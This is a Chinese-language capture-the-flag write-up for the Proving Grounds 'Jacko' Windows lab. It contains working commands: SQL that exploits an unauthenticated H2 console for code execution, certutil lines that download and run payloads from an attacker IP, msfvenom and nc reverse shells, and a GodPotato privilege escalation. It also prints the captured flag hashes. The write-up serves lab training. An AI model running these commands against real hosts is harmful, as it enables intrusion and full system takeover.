###### tags: `Offsec` `PG Practice` `Intermediate` `Windows`

# Jacko
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.176.66 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.176.66:80
Open 192.168.176.66:135
Open 192.168.176.66:139
Open 192.168.176.66:445
Open 192.168.176.66:8082
Open 192.168.176.66:5040
Open 192.168.176.66:9092
Open 192.168.176.66:49665
Open 192.168.176.66:49664
Open 192.168.176.66:49666
Open 192.168.176.66:49667
Open 192.168.176.66:49668
Open 192.168.176.66:49669

PORT      STATE SERVICE       REASON  VERSION
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-title: H2 Database Engine (redirect)
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
5040/tcp  open  unknown       syn-ack
8082/tcp  open  http          syn-ack H2 database http console
| http-methods: 
|_  Supported Methods: GET POST
|_http-title: H2 Console
|_http-favicon: Unknown favicon MD5: D2FBC2E4FB758DC8672CDEFB4D924540
9092/tcp  open  XmlIpcRegSvc? syn-ack
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

到`http://192.168.176.66:8082`可以直接不用密碼直接登入，參考[edb-49384](https://www.exploit-db.com/exploits/49384)，在`SQL statement`先塞入三個指令
```sql
SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', CHAR(0x4d),CHAR(0x5a),CHAR(0x90),CHAR(0x00),CHAR(0x03),CHAR(0x00),CHAR(0x00),CHAR(0x00),...
'ISO-8859-1', '', '', '', '', '');

CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');

CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
```

塞完可在`whoami`那邊弄reverse
```sql
┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.196 lport=445 -f exe > met_445.exe

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp445

## SQL statement
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil.exe -f -urlcache -split http://192.168.45.196/met_445.exe c:/windows/temp/met_445.exe").getInputStream()).useDelimiter("\\Z").next()');

CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("c:/windows/temp/met_445.exe").getInputStream()).useDelimiter("\\Z").next()');
```

得reverse，在`C:\Users\tony\Desktop`可得到local.txt
```
C:\Users\tony\Desktop>type local.txt
f19485a867b6cf182890d4d493b5603e
```

查看`whoami /priv`有`SeImpersonatePrivilege`
```
C:\Users\Public\Documents>set PATH=%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\system32\windowspowershell\v1.0\;

C:\Users\Public\Documents>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

因`printspoofer`不能用，用`Godpotato`可以用，在`C:\Users\Administrator\Desktop`可得proof.txt
```
C:\Users\Public\Documents>certutil.exe -urlcache -f http://192.168.45.196/nc.exe nc.exe

C:\Users\Public\Documents>certutil.exe -urlcache -f http://192.168.45.196/GodPotato-NET4.exe GodPotato.exe

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp8082

C:\Users\Public\Documents>GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.196 8082"

C:\Users\Administrator\Desktop>type proof.txt
c8d1fd32983fff07b77acc10cb59e18c
```